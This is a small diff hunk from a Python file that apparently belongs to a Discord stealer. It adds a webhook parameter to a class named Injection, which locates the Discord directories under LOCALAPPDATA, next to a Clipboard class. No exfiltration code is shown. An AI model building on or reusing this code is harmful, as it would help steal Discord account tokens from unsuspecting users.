@@ -886,7 +886,7 @@ class Clipboard:
 
 
 class Injection:
-    def __init__(self) -> None:
+    def __init__(self, webhook: str) -> None:
         self.appdata = os.getenv('LOCALAPPDATA')
         self.discord_dirs = [
             self.appdata + '\\Discord',
